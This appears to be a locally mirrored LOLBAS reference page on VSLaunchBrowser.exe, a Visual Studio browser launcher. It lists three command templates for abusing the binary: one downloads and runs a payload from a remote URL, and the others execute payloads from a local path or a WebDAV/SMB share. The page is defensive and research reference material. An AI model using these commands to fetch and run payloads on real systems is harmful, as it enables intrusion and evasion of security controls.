# LOLBAS: VSLaunchBrowser.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`, `Execute`

Microsoft Visual Studio browser launcher tool for web applications debugging

## Comandos

### It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

Download · priv: User · T1105

```cmd
VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
```

Download and execute payload from remote server

### It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

Execute · priv: User · T1127

```cmd
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
```

Execute payload via VSLaunchBrowser as parent process

### It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

Execute · priv: User · T1127

```cmd
VSLaunchBrowser.exe .exe {PATH_SMB}
```

Execute payload from WebDAV server via VSLaunchBrowser as parent process

